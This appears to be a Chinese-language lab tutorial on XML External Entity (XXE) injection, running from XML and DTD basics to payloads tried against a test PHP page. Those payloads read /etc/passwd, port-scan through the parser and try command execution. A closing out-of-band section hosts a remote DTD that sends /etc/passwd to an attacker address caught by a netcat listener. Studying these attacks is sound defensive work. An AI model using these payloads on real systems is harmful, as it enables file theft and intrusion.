# XML外部实体攻击简介

**XML外部实体攻击**（XXE，XML External Entity Injection），是一种针对解析[XML](https://zh.wikipedia.org/wiki/XML)格式应用程序的攻击类型之一。此类攻击发生在配置不当的XML解析器处理指向外部实体的文档时，可能会导致敏感文件泄露、拒绝服务攻击、服务器端请求伪造、端口扫描（解析器所在域）和其他系统影响。也就是XML外部实体注入攻击。漏洞是在对非安全的外部实体数据进行处理时引发的安全问题。

XML 1.0标准定义了XML文档结构，同时定义了实体的概念，即某种类型的存储单元。外部一般解析实体或外部参数解析实体通常简称为外部实体，攻击者可声明特定[系统标识符](https://zh.wikipedia.org/w/index.php?title=系统标识符&action=edit&redlink=1)来访问服务器本地或远程内容。XML处理器假设系统标识符为可访问的[统一资源标志符](https://zh.wikipedia.org/wiki/统一资源标志符)（URI），然后将同名的外部实体以系统标识符所指定的资源内容解除引用。若系统标识符被修改，则XML处理器可能会泄露应用程序通常无法访问的秘密信息。

XML旨在发送/存储易于阅读的数据，它是对应用程序中 XML解析器的攻击。XML解析常见于允许文件上传，解析 Office 文档，JSON 数据甚至 Flash 类型游戏的应用程序中。当允许 XML 解析时，不正确的验证可以授予攻击者读取文件的权限、导致拒绝服务攻击，甚至远程代码执行。从一个比较高的维度来看，应用程序具有以下需求：

1. 解析用户提供的XML数据
2. 实体的系统标识符部分必须在文档类型声明（DTD）内
3. XML处理器必须验证/处理DTD并解析外部实体。

# XML结构

> \- XML被设计为传输和存储数据，其焦点是数据的**内容**。
>
> \- HTML被设计用来显示数据，其焦点是数据的**外观**。

XML把数据从HTML分离，XML是独立于软件和硬件的信息传输工具。

基本语法：

* 所有 XML 元素都须有关闭标签。
* XML 标签对大小写敏感。
* XML 必须正确地嵌套，父级元素可以包含子级元素，子级元素可以有自己的子级元素。
* XML 文档必须有且只有一个根元素。
* XML 的属性值须加引号。

如果你把字符`<`放在 XML元素中，会发生错误，这是因为解析器会把它当作新元素的开始。

`<message>hello < world</message>`，为了避免错误。我们用实体引用`&lt;`来代替`<`字符。XML中，有5个预定义的实体引用。



## DTD属性

文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。DTD可被成行地声明于XML文档中，也可作为一个外部引用。

属性声明使用以下语法：

```
<!ATTLIST 元素名称 属性名称 属性类型 默认值>
```

DTD实例：

```
<!ATTLIST payment Hu3sky CDATA "H">
```

XML实例：

```
<payment Hu3sky="H" />
```

> [引用自：浅谈XML实体注入漏洞](https://www.freebuf.com/vuls/175451.html)

也就是说，`Hu3sky=`的值如果可以由用户控制，那么可以像构造XSS攻击一样，构造出攻击代码。



### 示例一

参考链接：[**XML 验证**](https://www.runoob.com/xml/xml-dtd.html)

```dtd
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE note SYSTEM "stu.dtd">
<stu id="1">
    <name>hacker</name>
    <age>18</age>
    <location area="CN">China</location>
    <hobbies>
        <tag>destroy</tag>
        <tag>read book</tag>
    </hobbies>
</stu>
```

### 示例二

```dtd
<?xml version="1.0"?>
<!DOCTYPE note [
<!ELEMENT note (to,from,heading,body)>
<!ELEMENT to (#PCDATA)>
<!ELEMENT from (#PCDATA)>
<!ELEMENT heading (#PCDATA)>
<!ELEMENT body (#PCDATA)>
]>
<note>
<to>Tove</to>
<from>Jani</from>
<heading>Reminder</heading>
<body>Don't forget me this weekend</body>
</note>
```

在上面的示例中，DOCTYPE 声明是对外部DTD文件的引用。下面的段落展示了这个文件的内容。

```dtd
<!DOCTYPE note
[
<!ELEMENT note (to,from,heading,body)>
<!ELEMENT to (#PCDATA)>
<!ELEMENT from (#PCDATA)>
<!ELEMENT heading (#PCDATA)>
<!ELEMENT body (#PCDATA)>
]>
```

> - **!DOCTYPE note** (第一行)定义此文档是 **note** 类型的文档。
> - **!ELEMENT note** (第三行)定义 **note** 元素有四个元素："to、from、heading,、body"
> - **!ELEMENT to** (第四行)定义 **to** 元素为 "#PCDATA" 类型
> - **!ELEMENT from** (第五行)定义 **from** 元素为 "#PCDATA" 类型
> - **!ELEMENT heading** (第六行)定义 **heading** 元素为 "#PCDATA" 类型
> - **!ELEMENT body** (第七行)定义 **body** 元素为 "#PCDATA" 类型

**外部文档声明**

假如DTD位于XML源文件的外部，那么它应通过下面的语法被封装在一个DOCTYPE定义中：

```dtd
<!DOCTYPE root-element SYSTEM "filename">
```

> 通过 DTD，您的每一个 XML 文件均可携带一个有关其自身格式的描述。
>
> 通过 DTD，独立的团体可一致地使用某个标准的 DTD 来交换数据。
>
> 而您的应用程序也可使用某个标准的 DTD 来验证从外部接收到的数据。
>
> 您还可以使用 DTD 来验证您自身的数据。

DTD 的目的是定义XML文档的结构。它使用一系列合法的元素来定义文档结构：

由于XML是由元素节点组成的树结构，元素之间可存在嵌套关系，因此XML解析器会对XML文档中所有文本也进行解析。为了能够在文本中兼容一些特殊字符 *（默认有`<`、`>`、`&`、`'`和`"`）* ，XML允许在DTD中声明实体并在文本中进行引用，如`<`预定义的实体引用是`<`，是不是有些眼熟？著名的` `其实也是HTML预定义的一个实体引用。

XML实体又分为**内部实体**和**外部实体**，声明方式如下：

```dtd
<!ENTITY name "value">
<!ENTITY name SYSTEM "URI">
<!ENTITY name PUBLIC "PUBLIC_ID" "URI">
```

外部实体声明中，分为`SYSTEM`和`PUBLIC`，前者表示私有资源 *（但不一定是本机）* ，后者表示公共资源。实体声明之后就可以在文本中进行引用了。

>  [原文链接：github.com/gyyyy](https://github.com/gyyyy/footprint/blob/master/articles/2018/xxe-injection-overview.md)

* 普通XML文件

    ```xml
    <?xml version="1.0" encoding="ISO-8859-1"?> 
    <Prod>
    <Type>Book</type>
    <name>THP</name>
    <id>100</id>
    </Prod>
    ```

* 恶意XML文件

    ```xml
    <!-- xml版本 编码格式 --> 
    <?xml version="1.0" encoding="utf-8"?>
    <!-- DOCTYPE test：指定根元素 --> 
    <!DOCTYPE test [ 
    <!ENTITY xxe SYSTEM 
    "etc/passwd">
    ]>
    <xxx>&xxe;</xxx>
    ```

    

# 有回显演示

![](https://borinboy.oss-cn-shanghai.aliyuncs.com/huan20210824232057.png)

构造payload

```
http://www.webtester.com/xxe.php?xml=%3C%3Fxml%20version%3D%221.0%22%3F%3E%3C%21DOCTYPE%20%20a%20%20%5B%3C%21ENTITY%20b%20SYSTEM%20%22file%3A%2f%2f%2fC%3A%2fWindows%2fwin.ini%22%3E%5D%3E%3Cc%3E%26b%3B%3C%2fc%3E
```

不知道为什么得到的结果是下面这个样子。。。不过已经和上面原始的页面的不一样了。

![](https://borinboy.oss-cn-shanghai.aliyuncs.com/huan20210824232908.png)

## 伪协议利用

在php中还可以利用伪协议读取任意文件

### file://

```dtd
<?xml version="1.0"?><!DOCTYPE  a  [<!ENTITY b SYSTEM "file:///etc/passwd">]><c>&b;</c>
```

```
http://www.webtester.com/xxe.php?xml=%3c%3fxml%20version%3d%221.0%22%3f%3e%3c!doctype%20%20a%20%20%5b%3c!entity%20b%20system%20%22file%3a%2f%2f%2fetc%2fpasswd%22%3e%5d%3e%3cc%3e%26b%3b%3c%2fc%3e
```

我也不知道为什么没有成功。。。查看源码：

```php
<?php
include 'init.php';

$string_xml = '<?xml version="1.0" encoding="utf-8"?><note><to>George</to><from>John</from><heading>Reminder</heading><body>xml实体注入</body></note>';

$xml = isset($_GET['xml'])?$_GET['xml']:$string_xml;
$data = simplexml_load_string($xml);
echo  '<meta charset="UTF-8">';
print_r($data);
?>
```

水平有限，看不出所以然来，看来要学一学**世界上最好的语言了**（手动狗头）。看下面的示例：

当我们点击`Hack The XML`的时候，用burp抓包，看到post提交了数据：

```
data=%3C%3Fxml+version%3D%221.0%22+%3F%3E%3C%21DOCTYPE+thp+%5B+%3C%21ELEMENT+thp+ANY%3E%3C%21ENTITY+book+%22Universe%22%3E%5D%3E%3Cthp%3EHack+The+%26book%3B%3C%2Fthp%3E
```

![](https://borinboy.oss-cn-shanghai.aliyuncs.com/xntz/20210831103002.png)

有没有感觉很熟悉，对，就是URL编码后的XML格式数据，可以使用burp的Decoder模块解码看看。

```dtd
<?xml version="1.0" ?><!DOCTYPE thp [ <!ELEMENT thp ANY><!ENTITY book system "file:///etc/passwd">]><thp>Hack The &book;</thp>
```

可以看到`DOCTYPE`定义根元素为`thp`，在`ELEMENT`中指定数据类型为任意类型，`ENTITY`定义了属性名称为`book`，接下来我们就开始搞事，修改book的值为`SYSTEM "file:///etc/passwd"`：

```
<?xml version="1.0" ?><!DOCTYPE thp [ <!ELEMENT thp ANY><!ENTITY book SYSTEM "file:///etc/passwd">]><thp>Hack The &book;</thp>
```

编码后的结果

```
%3C%3Fxml+version%3D%221.0%22+%3F%3E%3C%21DOCTYPE+thp+%5B+%3C%21ELEMENT+thp+ANY%3E%3C%21ENTITY+book+SYSTEM+%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E%3Cthp%3EHack+The+%26book%3B%3C%2Fthp%3E
```

通过burp重放

![](https://borinboy.oss-cn-shanghai.aliyuncs.com/xntz/20210831112622.png)

将Repeater修改后的data复制到Proxy中，点击forward，查看页面，可以看到这里也获取到了结果。

![](https://borinboy.oss-cn-shanghai.aliyuncs.com/xntz/20210831112644.png)

### php://

```dtd
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE xdsec [<!ELEMENT methodname ANY >
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=xxe.php" >]>
<methodcall>
<methodname>&xxe;</methodname>
</methodcall>
```

一如既往的没有成功。。。

### http://

扫描端口

```dtd
<?xml version="1.0"?>
<!DOCTYPE ANY [
<!ENTITY test SYSTEM "http://10.0.0.4:80">
]>
<abc>&test;</abc>
```

要裂开了，等回头请教大佬看看是怎么回事。

还有个很奇怪的点是，已经在虚拟机中修改了虚拟网络，部分虚拟机是按照`10.0.0.x`配置IP地址的，但是也有部分是按照路由器的设置来分配IP地址的，即使在虚拟机中设置网卡为`DHCP`也是无济于事，十分郁闷。

![](https://borinboy.oss-cn-shanghai.aliyuncs.com/huan20210825083438.png)

下面这是另外一个虚拟机，可以看到IP地址是和我们预想的保持一致的。

![](https://borinboy.oss-cn-shanghai.aliyuncs.com/huan20210825083713.png)

### expect://

执行命令

```dtd
<?xml version="1.0"?> <!doctype any [ <!entity test system "expect://whoami">
```

别想了，也不会有什么结果的。



# 无回显演示

无回显XXE又称为blind xxe，可以使用外带数据通道提取数据。

访问目标页面查看，发现什么都没有，就是这个样子。

![](https://borinboy.oss-cn-shanghai.aliyuncs.com/huan20210825084338.png)

构造payload，发送到后端

```dtd
?xml=<?xml version="1.0"?>
<!DOCTYPE ANY[
<!ENTITY % file c "file:///var/www/html/1.txt">
<!ENTITY % remote SYSTEM "http://10.0.0.4/evil.xml">
%remote;
%all;
]>
<root>&send;</root>
```

或者这样

```dtd
<!ENTITY % all "<!ENTITY send SYSTEM 'http://10.0.0.4/1.txt?file=%file;'>">
```

读取内容

```php
<?php file_put_contents("1.txt", $_GET['file']); ?>
```



## 高级 XXE——XXE-OOB

在之前的攻击中，我们能够在`<thp>`标签中获得返回的响应。那么如果我们看不到响应或遇到字符或文件限制怎
么办？我们怎样使用带外数据协议（OOB）来发送我们的数据？我们可以提供远程文档类型定义（DTD）文件来执行OOB-XXE，而不是在请求payload中定义我们的攻击。DTD是结构良好的XML文件，用于定义XML文档的结
构和法律元素及属性。为了简单起见，我们的DTD将包含我们所有的攻击或exfil payload，这将帮助我们解决许
多字符的限制。在我们的实验示例中，我们将有XXE漏洞的服务器请求一个托管在远程服务器上的DTD。

新的XXE攻击将分四个阶段进行：

1. 使用篡改后的XXE XML攻击
2. 对于存在漏洞的XML解析器，它会从攻击者服务器抓取DTD文件
3. 该DTD文件包含读取/etc/passwd文件的代码
4. 该DTD文件也包含用于隐秘传输/etc/passwd内容的代码（可能是经过编码的）

### 设置我们的攻击者机器和 XXE-OOB payload：

指定一个外部的DTD文件，而不是原始文件

```
<!ENTITY % dtd SYSTEM "http://Your_IP/payload.dtd"> %dtd;
```

新的“数据”POST payload将如下所示（记得更改Your_IP）：

```
<?xml version="1.0"?><!DOCTYPE thp [<!ELEMENT thp ANY ><!ENTITY % dtd SYSTEM
"http://[Your_IP]/payload.dtd"> %dtd;]><thp><error>%26send%3B</error></thp>
```

创建名为`payload.dtd`的文件在攻击者服务器上托管此payload

```
gedit /var/www/html/payload.dtd
```

```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % all "<!ENTITY send SYSTEM 'http://Your_IP:8888/collect=%file;'>">
%all;
```

刚刚创建的DTD文件指示靶机读取/etc/ passwd文件，然后尝试向攻击机发出Web请求，将敏感数据发送。为了确保我们收到响应，我们需要启动 Web 服务器来托管DTD文件并设置NetCat 监听器

```
nc -l -p 8888
```

有可能遇到“检测到实体引用循环”类型的错误，具体的报错内容大概是：

```
“Detected an entity reference loop in <b>/var/www/html/xxe.php on line <b>20"。
```

在进行XXE攻击时，通常会遇到解析器错误。很多时候，XXE解析器仅仅允许某些字符，因此读取带有特殊字符的文件会报错。我们可以做些什么来解决这个问题？在使用PHP的情况下，我们可以使用[PHP输入和输出流](http://php.net/manual/en/wrappers.php.php)来读取本地文件，并使用`php://filter/read=convert.base64-encode`对它们进行base64编码。重启我们的NetCat监听器并更改payload.dtd文件以使用此功能：

```
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-
encode/resource=file:///etc/passwd">
<!ENTITY % all "<!ENTITY send SYSTEM 'http://[Your_IP]:8888/collect=%file;'>">
%all;
```

一旦我们重放我们新修改的请求，我们现在就可以看到我们的目标服务器首先获取并运行了payload.dtd文件，然后监听8888端口的NetCat处理程序发出二次Web请求。当然，需要考虑对请求进行编码或解码的问题。

